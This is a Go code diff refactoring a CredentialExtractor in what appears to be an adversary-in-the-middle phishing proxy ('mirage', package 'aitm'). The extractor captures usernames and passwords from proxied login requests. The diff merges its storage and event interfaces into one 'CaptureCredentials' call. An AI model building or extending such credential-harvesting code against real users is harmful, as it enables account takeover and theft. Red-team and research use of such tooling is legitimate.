@@ -10,19 +10,14 @@ import (
 	"github.com/travisbale/mirage/internal/proxy"
 )
 
-type sessionUpdater interface {
-	UpdateSession(session *aitm.Session) error
-}
-
-type eventPublisher interface {
-	Publish(event aitm.Event)
+type credentialCapturer interface {
+	CaptureCredentials(session *aitm.Session) error
 }
 
 // CredentialExtractor captures username and password from matching login requests.
 type CredentialExtractor struct {
-	Store  sessionUpdater
-	Bus    eventPublisher
-	Logger *slog.Logger
+	Capturer credentialCapturer
+	Logger   *slog.Logger
 }
 
 func (h *CredentialExtractor) Name() string { return "CredentialExtractor" }
@@ -61,10 +56,9 @@ func (h *CredentialExtractor) Handle(ctx *aitm.ProxyContext, req *http.Request) 
 	}
 
 	if updated {
-		if err := h.Store.UpdateSession(ctx.Session); err != nil {
+		if err := h.Capturer.CaptureCredentials(ctx.Session); err != nil {
 			h.Logger.Warn("failed to persist captured credentials", "session_id", ctx.Session.ID, "error", err)
 		}
-		h.Bus.Publish(aitm.Event{Type: aitm.EventCredsCaptured, Payload: ctx.Session})
 	}
 	return nil
 }
